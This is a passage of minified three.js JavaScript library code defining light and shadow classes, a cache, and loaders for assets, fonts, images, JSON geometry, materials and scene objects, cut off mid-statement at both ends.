0!==b?b:1;this.receiveShadow=void 0};\nTHREE.Light.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Light,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.color.copy(a.color);this.intensity=a.intensity;return this},toJSON:function(a){a=THREE.Object3D.prototype.toJSON.call(this,a);a.object.color=this.color.getHex();a.object.intensity=this.intensity;void 0!==this.groundColor&&(a.object.groundColor=this.groundColor.getHex());void 0!==this.distance&&(a.object.distance=this.distance);void 0!==\nthis.angle&&(a.object.angle=this.angle);void 0!==this.decay&&(a.object.decay=this.decay);void 0!==this.penumbra&&(a.object.penumbra=this.penumbra);return a}});THREE.LightShadow=function(a){this.camera=a;this.bias=0;this.radius=1;this.mapSize=new THREE.Vector2(512,512);this.map=null;this.matrix=new THREE.Matrix4};Object.assign(THREE.LightShadow.prototype,{copy:function(a){this.camera=a.camera.clone();this.bias=a.bias;this.radius=a.radius;this.mapSize.copy(a.mapSize);return this},clone:function(){return(new this.constructor).copy(this)}});\nTHREE.AmbientLight=function(a,b){THREE.Light.call(this,a,b);this.type=\"AmbientLight\";this.castShadow=void 0};THREE.AmbientLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.AmbientLight});THREE.DirectionalLight=function(a,b){THREE.Light.call(this,a,b);this.type=\"DirectionalLight\";this.position.set(0,1,0);this.updateMatrix();this.target=new THREE.Object3D;this.shadow=new THREE.DirectionalLightShadow};\nTHREE.DirectionalLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.DirectionalLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});THREE.DirectionalLightShadow=function(a){THREE.LightShadow.call(this,new THREE.OrthographicCamera(-5,5,5,-5,.5,500))};THREE.DirectionalLightShadow.prototype=Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.DirectionalLightShadow});\nTHREE.HemisphereLight=function(a,b,c){THREE.Light.call(this,a,c);this.type=\"HemisphereLight\";this.castShadow=void 0;this.position.set(0,1,0);this.updateMatrix();this.groundColor=new THREE.Color(b)};THREE.HemisphereLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.HemisphereLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.groundColor.copy(a.groundColor);return this}});\nTHREE.PointLight=function(a,b,c,d){THREE.Light.call(this,a,b);this.type=\"PointLight\";Object.defineProperty(this,\"power\",{get:function(){return 4*this.intensity*Math.PI},set:function(a){this.intensity=a/(4*Math.PI)}});this.distance=void 0!==c?c:0;this.decay=void 0!==d?d:1;this.shadow=new THREE.LightShadow(new THREE.PerspectiveCamera(90,1,.5,500))};\nTHREE.PointLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.PointLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.decay=a.decay;this.shadow=a.shadow.clone();return this}});\nTHREE.SpotLight=function(a,b,c,d,e,f){THREE.Light.call(this,a,b);this.type=\"SpotLight\";this.position.set(0,1,0);this.updateMatrix();this.target=new THREE.Object3D;Object.defineProperty(this,\"power\",{get:function(){return this.intensity*Math.PI},set:function(a){this.intensity=a/Math.PI}});this.distance=void 0!==c?c:0;this.angle=void 0!==d?d:Math.PI/3;this.penumbra=void 0!==e?e:0;this.decay=void 0!==f?f:1;this.shadow=new THREE.SpotLightShadow};\nTHREE.SpotLight.prototype=Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.SpotLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.angle=a.angle;this.penumbra=a.penumbra;this.decay=a.decay;this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});THREE.SpotLightShadow=function(){THREE.LightShadow.call(this,new THREE.PerspectiveCamera(50,1,.5,500))};\nTHREE.SpotLightShadow.prototype=Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.SpotLightShadow,update:function(a){var b=2*THREE.Math.RAD2DEG*a.angle,c=this.mapSize.width/this.mapSize.height;a=a.distance||500;var d=this.camera;if(b!==d.fov||c!==d.aspect||a!==d.far)d.fov=b,d.aspect=c,d.far=a,d.updateProjectionMatrix()}});THREE.AudioLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.AudioLoader.prototype,{load:function(a,b,c,d){var e=new THREE.XHRLoader(this.manager);e.setResponseType(\"arraybuffer\");e.load(a,function(a){THREE.AudioContext.decodeAudioData(a,function(a){b(a)})},c,d)}});THREE.Cache={enabled:!1,files:{},add:function(a,b){!1!==this.enabled&&(this.files[a]=b)},get:function(a){if(!1!==this.enabled)return this.files[a]},remove:function(a){delete this.files[a]},clear:function(){this.files={}}};\nTHREE.Loader=function(){this.onLoadStart=function(){};this.onLoadProgress=function(){};this.onLoadComplete=function(){}};\nTHREE.Loader.prototype={constructor:THREE.Loader,crossOrigin:void 0,extractUrlBase:function(a){a=a.split(\"/\");if(1===a.length)return\"./\";a.pop();return a.join(\"/\")+\"/\"},initMaterials:function(a,b,c){for(var d=[],e=0;e<a.length;++e)d[e]=this.createMaterial(a[e],b,c);return d},createMaterial:function(){var a,b,c;return function(d,e,f){function g(a,c,d,g,k){a=e+a;var l=THREE.Loader.Handlers.get(a);null!==l?a=l.load(a):(b.setCrossOrigin(f),a=b.load(a));void 0!==c&&(a.repeat.fromArray(c),1!==c[0]&&(a.wrapS=\nTHREE.RepeatWrapping),1!==c[1]&&(a.wrapT=THREE.RepeatWrapping));void 0!==d&&a.offset.fromArray(d);void 0!==g&&(\"repeat\"===g[0]&&(a.wrapS=THREE.RepeatWrapping),\"mirror\"===g[0]&&(a.wrapS=THREE.MirroredRepeatWrapping),\"repeat\"===g[1]&&(a.wrapT=THREE.RepeatWrapping),\"mirror\"===g[1]&&(a.wrapT=THREE.MirroredRepeatWrapping));void 0!==k&&(a.anisotropy=k);c=THREE.Math.generateUUID();h[c]=a;return c}void 0===a&&(a=new THREE.Color);void 0===b&&(b=new THREE.TextureLoader);void 0===c&&(c=new THREE.MaterialLoader);\nvar h={},k={uuid:THREE.Math.generateUUID(),type:\"MeshLambertMaterial\"},l;for(l in d){var n=d[l];switch(l){case \"DbgColor\":case \"DbgIndex\":case \"opticalDensity\":case \"illumination\":break;case \"DbgName\":k.name=n;break;case \"blending\":k.blending=THREE[n];break;case \"colorAmbient\":case \"mapAmbient\":console.warn(\"THREE.Loader.createMaterial:\",l,\"is no longer supported.\");break;case \"colorDiffuse\":k.color=a.fromArray(n).getHex();break;case \"colorSpecular\":k.specular=a.fromArray(n).getHex();break;case \"colorEmissive\":k.emissive=\na.fromArray(n).getHex();break;case \"specularCoef\":k.shininess=n;break;case \"shading\":\"basic\"===n.toLowerCase()&&(k.type=\"MeshBasicMaterial\");\"phong\"===n.toLowerCase()&&(k.type=\"MeshPhongMaterial\");\"standard\"===n.toLowerCase()&&(k.type=\"MeshStandardMaterial\");break;case \"mapDiffuse\":k.map=g(n,d.mapDiffuseRepeat,d.mapDiffuseOffset,d.mapDiffuseWrap,d.mapDiffuseAnisotropy);break;case \"mapDiffuseRepeat\":case \"mapDiffuseOffset\":case \"mapDiffuseWrap\":case \"mapDiffuseAnisotropy\":break;case \"mapEmissive\":k.emissiveMap=\ng(n,d.mapEmissiveRepeat,d.mapEmissiveOffset,d.mapEmissiveWrap,d.mapEmissiveAnisotropy);break;case \"mapEmissiveRepeat\":case \"mapEmissiveOffset\":case \"mapEmissiveWrap\":case \"mapEmissiveAnisotropy\":break;case \"mapLight\":k.lightMap=g(n,d.mapLightRepeat,d.mapLightOffset,d.mapLightWrap,d.mapLightAnisotropy);break;case \"mapLightRepeat\":case \"mapLightOffset\":case \"mapLightWrap\":case \"mapLightAnisotropy\":break;case \"mapAO\":k.aoMap=g(n,d.mapAORepeat,d.mapAOOffset,d.mapAOWrap,d.mapAOAnisotropy);break;case \"mapAORepeat\":case \"mapAOOffset\":case \"mapAOWrap\":case \"mapAOAnisotropy\":break;\ncase \"mapBump\":k.bumpMap=g(n,d.mapBumpRepeat,d.mapBumpOffset,d.mapBumpWrap,d.mapBumpAnisotropy);break;case \"mapBumpScale\":k.bumpScale=n;break;case \"mapBumpRepeat\":case \"mapBumpOffset\":case \"mapBumpWrap\":case \"mapBumpAnisotropy\":break;case \"mapNormal\":k.normalMap=g(n,d.mapNormalRepeat,d.mapNormalOffset,d.mapNormalWrap,d.mapNormalAnisotropy);break;case \"mapNormalFactor\":k.normalScale=[n,n];break;case \"mapNormalRepeat\":case \"mapNormalOffset\":case \"mapNormalWrap\":case \"mapNormalAnisotropy\":break;case \"mapSpecular\":k.specularMap=\ng(n,d.mapSpecularRepeat,d.mapSpecularOffset,d.mapSpecularWrap,d.mapSpecularAnisotropy);break;case \"mapSpecularRepeat\":case \"mapSpecularOffset\":case \"mapSpecularWrap\":case \"mapSpecularAnisotropy\":break;case \"mapMetalness\":k.metalnessMap=g(n,d.mapMetalnessRepeat,d.mapMetalnessOffset,d.mapMetalnessWrap,d.mapMetalnessAnisotropy);break;case \"mapMetalnessRepeat\":case \"mapMetalnessOffset\":case \"mapMetalnessWrap\":case \"mapMetalnessAnisotropy\":break;case \"mapRoughness\":k.roughnessMap=g(n,d.mapRoughnessRepeat,\nd.mapRoughnessOffset,d.mapRoughnessWrap,d.mapRoughnessAnisotropy);break;case \"mapRoughnessRepeat\":case \"mapRoughnessOffset\":case \"mapRoughnessWrap\":case \"mapRoughnessAnisotropy\":break;case \"mapAlpha\":k.alphaMap=g(n,d.mapAlphaRepeat,d.mapAlphaOffset,d.mapAlphaWrap,d.mapAlphaAnisotropy);break;case \"mapAlphaRepeat\":case \"mapAlphaOffset\":case \"mapAlphaWrap\":case \"mapAlphaAnisotropy\":break;case \"flipSided\":k.side=THREE.BackSide;break;case \"doubleSided\":k.side=THREE.DoubleSide;break;case \"transparency\":console.warn(\"THREE.Loader.createMaterial: transparency has been renamed to opacity\");\nk.opacity=n;break;case \"depthTest\":case \"depthWrite\":case \"colorWrite\":case \"opacity\":case \"reflectivity\":case \"transparent\":case \"visible\":case \"wireframe\":k[l]=n;break;case \"vertexColors\":!0===n&&(k.vertexColors=THREE.VertexColors);\"face\"===n&&(k.vertexColors=THREE.FaceColors);break;default:console.error(\"THREE.Loader.createMaterial: Unsupported\",l,n)}}\"MeshBasicMaterial\"===k.type&&delete k.emissive;\"MeshPhongMaterial\"!==k.type&&delete k.specular;1>k.opacity&&(k.transparent=!0);c.setTextures(h);\nreturn c.parse(k)}}()};THREE.Loader.Handlers={handlers:[],add:function(a,b){this.handlers.push(a,b)},get:function(a){for(var b=this.handlers,c=0,d=b.length;c<d;c+=2){var e=b[c+1];if(b[c].test(a))return e}return null}};THREE.XHRLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.XHRLoader.prototype,{load:function(a,b,c,d){void 0!==this.path&&(a=this.path+a);var e=this,f=THREE.Cache.get(a);if(void 0!==f)return b&&setTimeout(function(){b(f)},0),f;var g=new XMLHttpRequest;g.overrideMimeType(\"text/plain\");g.open(\"GET\",a,!0);g.addEventListener(\"load\",function(c){var f=c.target.response;THREE.Cache.add(a,f);200===this.status?(b&&b(f),e.manager.itemEnd(a)):0===this.status?(console.warn(\"THREE.XHRLoader: HTTP Status 0 received.\"),b&&b(f),e.manager.itemEnd(a)):\n(d&&d(c),e.manager.itemError(a))},!1);void 0!==c&&g.addEventListener(\"progress\",function(a){c(a)},!1);g.addEventListener(\"error\",function(b){d&&d(b);e.manager.itemError(a)},!1);void 0!==this.responseType&&(g.responseType=this.responseType);void 0!==this.withCredentials&&(g.withCredentials=this.withCredentials);g.send(null);e.manager.itemStart(a);return g},setPath:function(a){this.path=a;return this},setResponseType:function(a){this.responseType=a;return this},setWithCredentials:function(a){this.withCredentials=\na;return this}});THREE.FontLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};Object.assign(THREE.FontLoader.prototype,{load:function(a,b,c,d){var e=this;(new THREE.XHRLoader(this.manager)).load(a,function(a){var c;try{c=JSON.parse(a)}catch(d){console.warn(\"THREE.FontLoader: typeface.js support is being deprecated. Use typeface.json instead.\"),c=JSON.parse(a.substring(65,a.length-2))}a=e.parse(c);b&&b(a)},c,d)},parse:function(a){return new THREE.Font(a)}});\nTHREE.ImageLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.ImageLoader.prototype,{load:function(a,b,c,d){var e=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"img\");e.onload=function(){URL.revokeObjectURL(e.src);b&&b(e)};if(0===a.indexOf(\"data:\"))e.src=a;else{var f=new THREE.XHRLoader(this.manager);f.setPath(this.path);f.setResponseType(\"blob\");f.load(a,function(a){e.src=URL.createObjectURL(a)},c,d)}return e},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});\nTHREE.JSONLoader=function(a){\"boolean\"===typeof a&&(console.warn(\"THREE.JSONLoader: showStatus parameter has been removed from constructor.\"),a=void 0);this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this.withCredentials=!1};\nObject.assign(THREE.JSONLoader.prototype,{load:function(a,b,c,d){var e=this,f=this.texturePath&&\"string\"===typeof this.texturePath?this.texturePath:THREE.Loader.prototype.extractUrlBase(a),g=new THREE.XHRLoader(this.manager);g.setWithCredentials(this.withCredentials);g.load(a,function(c){c=JSON.parse(c);var d=c.metadata;if(void 0!==d&&(d=d.type,void 0!==d)){if(\"object\"===d.toLowerCase()){console.error(\"THREE.JSONLoader: \"+a+\" should be loaded with THREE.ObjectLoader instead.\");return}if(\"scene\"===\nd.toLowerCase()){console.error(\"THREE.JSONLoader: \"+a+\" should be loaded with THREE.SceneLoader instead.\");return}}c=e.parse(c,f);b(c.geometry,c.materials)},c,d)},setTexturePath:function(a){this.texturePath=a},parse:function(a,b){var c=new THREE.Geometry,d=void 0!==a.scale?1/a.scale:1;(function(b){var d,g,h,k,l,n,p,m,q,r,s,t,u,v=a.faces;n=a.vertices;var C=a.normals,w=a.colors,E=0;if(void 0!==a.uvs){for(d=0;d<a.uvs.length;d++)a.uvs[d].length&&E++;for(d=0;d<E;d++)c.faceVertexUvs[d]=[]}k=0;for(l=n.length;k<\nl;)d=new THREE.Vector3,d.x=n[k++]*b,d.y=n[k++]*b,d.z=n[k++]*b,c.vertices.push(d);k=0;for(l=v.length;k<l;)if(b=v[k++],q=b&1,h=b&2,d=b&8,p=b&16,r=b&32,n=b&64,b&=128,q){q=new THREE.Face3;q.a=v[k];q.b=v[k+1];q.c=v[k+3];s=new THREE.Face3;s.a=v[k+1];s.b=v[k+2];s.c=v[k+3];k+=4;h&&(h=v[k++],q.materialIndex=h,s.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<E;d++)for(t=a.uvs[d],c.faceVertexUvs[d][h]=[],c.faceVertexUvs[d][h+1]=[],g=0;4>g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),2!==g&&c.faceVertexUvs[d][h].push(u),\n0!==g&&c.faceVertexUvs[d][h+1].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]),s.normal.copy(q.normal));if(r)for(d=0;4>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),2!==d&&q.vertexNormals.push(r),0!==d&&s.vertexNormals.push(r);n&&(n=v[k++],n=w[n],q.color.setHex(n),s.color.setHex(n));if(b)for(d=0;4>d;d++)n=v[k++],n=w[n],2!==d&&q.vertexColors.push(new THREE.Color(n)),0!==d&&s.vertexColors.push(new THREE.Color(n));c.faces.push(q);c.faces.push(s)}else{q=new THREE.Face3;q.a=v[k++];q.b=\nv[k++];q.c=v[k++];h&&(h=v[k++],q.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<E;d++)for(t=a.uvs[d],c.faceVertexUvs[d][h]=[],g=0;3>g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),c.faceVertexUvs[d][h].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]));if(r)for(d=0;3>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),q.vertexNormals.push(r);n&&(n=v[k++],q.color.setHex(w[n]));if(b)for(d=0;3>d;d++)n=v[k++],q.vertexColors.push(new THREE.Color(w[n]));c.faces.push(q)}})(d);(function(){var b=\nvoid 0!==a.influencesPerVertex?a.influencesPerVertex:2;if(a.skinWeights)for(var d=0,g=a.skinWeights.length;d<g;d+=b)c.skinWeights.push(new THREE.Vector4(a.skinWeights[d],1<b?a.skinWeights[d+1]:0,2<b?a.skinWeights[d+2]:0,3<b?a.skinWeights[d+3]:0));if(a.skinIndices)for(d=0,g=a.skinIndices.length;d<g;d+=b)c.skinIndices.push(new THREE.Vector4(a.skinIndices[d],1<b?a.skinIndices[d+1]:0,2<b?a.skinIndices[d+2]:0,3<b?a.skinIndices[d+3]:0));c.bones=a.bones;c.bones&&0<c.bones.length&&(c.skinWeights.length!==\nc.skinIndices.length||c.skinIndices.length!==c.vertices.length)&&console.warn(\"When skinning, number of vertices (\"+c.vertices.length+\"), skinIndices (\"+c.skinIndices.length+\"), and skinWeights (\"+c.skinWeights.length+\") should match.\")})();(function(b){if(void 0!==a.morphTargets)for(var d=0,g=a.morphTargets.length;d<g;d++){c.morphTargets[d]={};c.morphTargets[d].name=a.morphTargets[d].name;c.morphTargets[d].vertices=[];for(var h=c.morphTargets[d].vertices,k=a.morphTargets[d].vertices,l=0,n=k.length;l<\nn;l+=3){var p=new THREE.Vector3;p.x=k[l]*b;p.y=k[l+1]*b;p.z=k[l+2]*b;h.push(p)}}if(void 0!==a.morphColors&&0<a.morphColors.length)for(console.warn('THREE.JSONLoader: \"morphColors\" no longer supported. Using them as face colors.'),b=c.faces,h=a.morphColors[0].colors,d=0,g=b.length;d<g;d++)b[d].color.fromArray(h,3*d)})(d);(function(){var b=[],d=[];void 0!==a.animation&&d.push(a.animation);void 0!==a.animations&&(a.animations.length?d=d.concat(a.animations):d.push(a.animations));for(var g=0;g<d.length;g++){var h=\nTHREE.AnimationClip.parseAnimation(d[g],c.bones);h&&b.push(h)}c.morphTargets&&(d=THREE.AnimationClip.CreateClipsFromMorphTargetSequences(c.morphTargets,10),b=b.concat(d));0<b.length&&(c.animations=b)})();c.computeFaceNormals();c.computeBoundingSphere();if(void 0===a.materials||0===a.materials.length)return{geometry:c};d=THREE.Loader.prototype.initMaterials(a.materials,b,this.crossOrigin);return{geometry:c,materials:d}}});\nTHREE.LoadingManager=function(a,b,c){var d=this,e=!1,f=0,g=0;this.onStart=void 0;this.onLoad=a;this.onProgress=b;this.onError=c;this.itemStart=function(a){g++;if(!1===e&&void 0!==d.onStart)d.onStart(a,f,g);e=!0};this.itemEnd=function(a){f++;if(void 0!==d.onProgress)d.onProgress(a,f,g);if(f===g&&(e=!1,void 0!==d.onLoad))d.onLoad()};this.itemError=function(a){if(void 0!==d.onError)d.onError(a)}};THREE.DefaultLoadingManager=new THREE.LoadingManager;\nTHREE.BufferGeometryLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.BufferGeometryLoader.prototype,{load:function(a,b,c,d){var e=this;(new THREE.XHRLoader(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},parse:function(a){var b=new THREE.BufferGeometry,c=a.data.index,d={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};void 0!==c&&(c=new d[c.type](c.array),b.setIndex(new THREE.BufferAttribute(c,\n1)));var e=a.data.attributes,f;for(f in e){var g=e[f],c=new d[g.type](g.array);b.addAttribute(f,new THREE.BufferAttribute(c,g.itemSize,g.normalized))}d=a.data.groups||a.data.drawcalls||a.data.offsets;if(void 0!==d)for(f=0,c=d.length;f!==c;++f)e=d[f],b.addGroup(e.start,e.count,e.materialIndex);a=a.data.boundingSphere;void 0!==a&&(d=new THREE.Vector3,void 0!==a.center&&d.fromArray(a.center),b.boundingSphere=new THREE.Sphere(d,a.radius));return b}});\nTHREE.MaterialLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this.textures={}};\nObject.assign(THREE.MaterialLoader.prototype,{load:function(a,b,c,d){var e=this;(new THREE.XHRLoader(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},setTextures:function(a){this.textures=a},getTexture:function(a){var b=this.textures;void 0===b[a]&&console.warn(\"THREE.MaterialLoader: Undefined texture\",a);return b[a]},parse:function(a){var b=new THREE[a.type];void 0!==a.uuid&&(b.uuid=a.uuid);void 0!==a.name&&(b.name=a.name);void 0!==a.color&&b.color.setHex(a.color);void 0!==a.roughness&&\n(b.roughness=a.roughness);void 0!==a.metalness&&(b.metalness=a.metalness);void 0!==a.emissive&&b.emissive.setHex(a.emissive);void 0!==a.specular&&b.specular.setHex(a.specular);void 0!==a.shininess&&(b.shininess=a.shininess);void 0!==a.uniforms&&(b.uniforms=a.uniforms);void 0!==a.vertexShader&&(b.vertexShader=a.vertexShader);void 0!==a.fragmentShader&&(b.fragmentShader=a.fragmentShader);void 0!==a.vertexColors&&(b.vertexColors=a.vertexColors);void 0!==a.shading&&(b.shading=a.shading);void 0!==a.blending&&\n(b.blending=a.blending);void 0!==a.side&&(b.side=a.side);void 0!==a.opacity&&(b.opacity=a.opacity);void 0!==a.transparent&&(b.transparent=a.transparent);void 0!==a.alphaTest&&(b.alphaTest=a.alphaTest);void 0!==a.depthTest&&(b.depthTest=a.depthTest);void 0!==a.depthWrite&&(b.depthWrite=a.depthWrite);void 0!==a.colorWrite&&(b.colorWrite=a.colorWrite);void 0!==a.wireframe&&(b.wireframe=a.wireframe);void 0!==a.wireframeLinewidth&&(b.wireframeLinewidth=a.wireframeLinewidth);void 0!==a.size&&(b.size=a.size);\nvoid 0!==a.sizeAttenuation&&(b.sizeAttenuation=a.sizeAttenuation);void 0!==a.map&&(b.map=this.getTexture(a.map));void 0!==a.alphaMap&&(b.alphaMap=this.getTexture(a.alphaMap),b.transparent=!0);void 0!==a.bumpMap&&(b.bumpMap=this.getTexture(a.bumpMap));void 0!==a.bumpScale&&(b.bumpScale=a.bumpScale);void 0!==a.normalMap&&(b.normalMap=this.getTexture(a.normalMap));if(void 0!==a.normalScale){var c=a.normalScale;!1===Array.isArray(c)&&(c=[c,c]);b.normalScale=(new THREE.Vector2).fromArray(c)}void 0!==a.displacementMap&&\n(b.displacementMap=this.getTexture(a.displacementMap));void 0!==a.displacementScale&&(b.displacementScale=a.displacementScale);void 0!==a.displacementBias&&(b.displacementBias=a.displacementBias);void 0!==a.roughnessMap&&(b.roughnessMap=this.getTexture(a.roughnessMap));void 0!==a.metalnessMap&&(b.metalnessMap=this.getTexture(a.metalnessMap));void 0!==a.emissiveMap&&(b.emissiveMap=this.getTexture(a.emissiveMap));void 0!==a.emissiveIntensity&&(b.emissiveIntensity=a.emissiveIntensity);void 0!==a.specularMap&&\n(b.specularMap=this.getTexture(a.specularMap));void 0!==a.envMap&&(b.envMap=this.getTexture(a.envMap),b.combine=THREE.MultiplyOperation);void 0!==a.reflectivity&&(b.reflectivity=a.reflectivity);void 0!==a.lightMap&&(b.lightMap=this.getTexture(a.lightMap));void 0!==a.lightMapIntensity&&(b.lightMapIntensity=a.lightMapIntensity);void 0!==a.aoMap&&(b.aoMap=this.getTexture(a.aoMap));void 0!==a.aoMapIntensity&&(b.aoMapIntensity=a.aoMapIntensity);if(void 0!==a.materials)for(var c=0,d=a.materials.length;c<\nd;c++)b.materials.push(this.parse(a.materials[c]));return b}});THREE.ObjectLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this.texturePath=\"\"};\nObject.assign(THREE.ObjectLoader.prototype,{load:function(a,b,c,d){\"\"===this.texturePath&&(this.texturePath=a.substring(0,a.lastIndexOf(\"/\")+1));var e=this;(new THREE.XHRLoader(e.manager)).load(a,function(a){e.parse(JSON.parse(a),b)},c,d)},setTexturePath:function(a){this.texturePath=a},setCrossOrigin:function(a){this.crossOrigin=a},parse:function(a,b){var c=this.parseGeometries(a.geometries),d=this.parseImages(a.images,function(){void 0!==b&&b(e)}),d=this.parseTextures(a.textures,d),d=this.parseMaterials(a.materials,\nd),e=this.parseObject(a.object,c,d);a.animations&&(e.animations=this.parseAnimations(a.animations));void 0!==a.images&&0!==a.images.length||void 0===b||b(e);return e},parseGeometries:function(a){var b={};if(void 0!==a)for(var c=new THREE.JSONLoader,d=new THREE.BufferGeometryLoader,e=0,f=a.length;e<f;e++){var g,h=a[e];switch(h.type){case \"PlaneGeometry\":case \"PlaneBufferGeometry\":g=new THREE[h.type](h.width,h.height,h.widthSegments,h.heightSegments);break;case \"BoxGeometry\":case \"BoxBufferGeometry\":case \"CubeGeometry\":g=\nnew THREE[h.type](h.width,h.height,h.depth,h.widthSegments,h.heightSegments,h.depthSegments);break;case \"CircleGeometry\":case \"CircleBufferGeometry\":g=new THREE[h.type](h.radius,h.segments,h.thetaStart,h.thetaLength);break;case \"CylinderGeometry\":case \"CylinderBufferGeometry\":g=new THREE[h.type](h.radiusTop,h.radiusBottom,h.height,h.radialSegments,h.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"ConeGeometry\":case \"ConeBufferGeometry\":g=new THREE[h.type](h.radius,h.height,h.radialSegments,\nh.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"SphereGeometry\":case \"SphereBufferGeometry\":g=new THREE[h.type](h.radius,h.widthSegments,h.heightSegments,h.phiStart,h.phiLength,h.thetaStart,h.thetaLength);break;case \"DodecahedronGeometry\":case \"IcosahedronGeometry\":case \"OctahedronGeometry\":case \"TetrahedronGeometry\":g=new THREE[h.type](h.radius,h.detail);break;case \"RingGeometry\":case \"RingBufferGeometry\":g=new THREE[h.type](h.innerRadius,h.outerRadius,h.thetaSegments,h.phiSegments,\nh.thetaStart,h.thetaLength);break;case \"TorusGeometry\":case \"TorusBufferGeometry\":g=new THREE[h.type](h.radius,h.tube,h.radialSegments,h.tubularSegments,h.arc);break;case \"TorusKnotGeometry\":case \"TorusKnotBufferGeometry\":g=new THREE[h.type](h.radius,h.tube,h.tubularSegments,h.radialSegments,h.p,h.q);break;case \"LatheGeometry\":case \"LatheBufferGeometry\":g=new THREE[h.type](h.points,h.segments,h.phiStart,h.phiLength);break;case \"BufferGeometry\":g=d.parse(h);break;case \"Geometry\":g=c.parse(h.data,this.texturePath).geometry;\nbreak;default:console.warn('THREE.ObjectLoader: Unsupported geometry type \"'+h.type+'\"');continue}g.uuid=h.uuid;void 0!==h.name&&(g.name=h.name);b[h.uuid]=g}return b},parseMaterials:function(a,b){var c={};if(void 0!==a){var d=new THREE.MaterialLoader;d.setTextures(b);for(var e=0,f=a.length;e<f;e++){var g=d.parse(a[e]);c[g.uuid]=g}}return c},parseAnimations:function(a){for(var b=[],c=0;c<a.length;c++){var d=THREE.AnimationClip.parse(a[c]);b.push(d)}return b},parseImages:function(a,b){function c(a){d.manager.itemStart(a);\nreturn g.load(a,function(){d.manager.itemEnd(a)})}var d=this,e={};if(void 0!==a&&0<a.length){var f=new THREE.LoadingManager(b),g=new THREE.ImageLoader(f);g.setCrossOrigin(this.crossOrigin);for(var f=0,h=a.length;f<h;f++){var k=a[f],l=/^(\\/\\/)|([a-z]+:(\\/\\/)?)/i.test(k.url)?k.url:d.texturePath+k.url;e[k.uuid]=c(l)}}return e},parseTextures:function(a,b){function c(a){if(\"number\"===typeof a)return a;console.warn(\"THREE.ObjectLoader.parseTexture: Constant should be in numeric form.\",a);return THREE[a]}\nvar d={};if(void 0!==a)for(var e=0,f=a.length;e<f;e++){var g=a[e];void 0===g.image&&console.warn('THREE.ObjectLoader: No \"image\" specified for',g.uuid);void 0===b[g.image]&&console.warn(\"THREE.ObjectLoader: Undefined image\",g.image);var h=new THREE.Texture(b[g.image]);h.needsUpdate=!0;h.uuid=g.uuid;void 0!==g.name&&(h.name=g.name);void 0!==g.mapping&&(h.mapping=c(g.mapping));void 0!==g.offset&&(h.offset=new THREE.Vector2(g.offset[0],g.offset[1]));void 0!==g.repeat&&(h.repeat=new THREE.Vector2(g.repeat[0],\ng.repeat[1]));void 0!==g.minFilter&&(h.minFilter=c(g.minFilter));void 0!==g.magFilter&&(h.magFilter=c(g.magFilter));void 0!==g.anisotropy&&(h.anisotropy=g.anisotropy);Array.isArray(g.wrap)&&(h.wrapS=c(g.wrap[0]),h.wrapT=c(g.wrap[1]));d[g.uuid]=h}return d},parseObject:function(){var a=new THREE.Matrix4;return function(b,c,d){function e(a){void 0===c[a]&&console.warn(\"THREE.ObjectLoader: Undefined geometry\",a);return c[a]}function f(a){if(void 0!==a)return void 0===d[a]&&console.warn(\"THREE.ObjectLoader: Undefined material\",\na),d[a]}var g;switch(b.type){case \"Scene\":g=new THREE.Scene;break;case \"PerspectiveCamera\":g=new THREE.PerspectiveCamera(b.fov,b.aspect,b.near,b.far);void 0!==b.focus&&(g.focus=b.focus);void 0!==b.zoom&&(g.zoom=b.zoom);void 0!==b.filmGauge&&(g.filmGauge=b.filmGauge);void 0!==b.filmOffset&&(g.filmOffset=b.filmOffset);void 0!==b.view&&(g.view=Object.assign({},b.view));break;case \"OrthographicCamera\":g=new THREE.OrthographicCamera(b.left,b.right,b.top,b.bottom,b.near,b.far);break;case \"AmbientLight\":g=\nnew THREE.AmbientLight(b.color,b.intensity);break;case \"DirectionalLight\":g=new 